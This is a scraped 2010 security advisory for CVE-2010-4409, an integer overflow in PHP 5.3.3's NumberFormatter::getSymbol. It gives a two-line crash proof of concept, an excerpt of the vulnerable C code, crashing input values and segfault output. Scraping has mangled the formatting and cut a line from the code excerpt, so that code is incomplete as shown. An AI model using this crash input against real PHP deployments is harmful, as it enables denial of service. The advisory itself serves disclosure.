{
    "text": "title : PHP 5.3.3 Integer Overflow  ， detail : PHP version 5.3.3 suffers from a NumberFormatter : getSymbol integer overflow vulnerability.  ， cve : advisories | CVE-2010-4409  ，  ， desc : -BEGIN PGP SIGNED MESSAGE-  ， Hash : SHA1  ，  [ PHP 5.3.3 NumberFormatter : getSymbol Integer Overflow ]   ， Author : Maksymilian Arciemowicz  ， http : /securityreason.com/  ， http : /cxib.net/  ， Date :   ， - - Dis. : 11.11.2010  ， - - Pub. : 10.12.2010  ， CERT : VU # 479900  ， CVE : CVE-2010-4409  ， CWE : CWE-189  ， Status : Fixed in PHP 5.3.4  ， Affected Software :   ， - - PHP 5.3.3  ， Original URL :   ， http : /securityreason.com/achievement_securityalert/91  ， - - 0.Description -  ， Internationalization extension ( further is referred as Intl ) is a wrapper for ICU library , enabling PHP programmers to perform UCA-conformant collation and date/time/number/currency formatting in their scripts.  ， Number Formatter : allows to display number according to the localized format or given pattern or set of rules , and to parse strings into numbers.  ， - - 1. PoC for Integer Overflow -  ，  $ nx=new NumberFormatter ( \"pl\" , 1 )  ;   ，  $ nx->getSymbol ( 2147483648 )  ;   ， - - 2. PHP 5.3.3/5.2.14 NumberFormatter : getSymbol Integer Overflow -  ， As we can see in  ，  ， PHP_FUNCTION ( numfmt_get_symbol )   ， {  ， long symbol ;   ， UChar value_buf [ 4 ]  ;   ， UChar * value = value_buf ;   ， int length = USIZE ( value )  ;   ， FORMATTER_METHOD_INIT_VARS ;   ， / * Parse parameters. * /  ，  ， \"Ol\" ,   ， &object , NumberFormatter_ce_ptr , &symbol ) = FAILURE )   ， {  ， intl_error_set ( NULL , U_ILLEGAL_ARGUMENT_ERROR ,   ， \"numfmt_get_symbol : unable to parse input params\" , 0 TSRMLS_CC )  ;   ， RETURN_FALSE ;   ， }  ， / * Fetch the object. * /  ， FORMATTER_METHOD_FETCH_OBJECT ;   ， length = unum_getSymbol ( FORMATTER_OBJECT ( nfo )  , symbol , value_buf ,   ， length , &INTL_DATA_ERROR_CODE ( nfo )  ; <= ! TO BIG INT HERE !   ， .  ，  ， will crash for differ value. example {2444492804 , 2147483648 ,   ， 2147483649 , 2554462209} ( when rdi out off band ( range 2to31 2to32 under 64bits linux )   ， Program received signal SIGSEGV , Segmentation fault.  ， 0x00007fffedf317f5 in icu_4_2 : UnicodeString : extract ( unsigned short *  , ",
    "time": "Dec 10, 2010"
}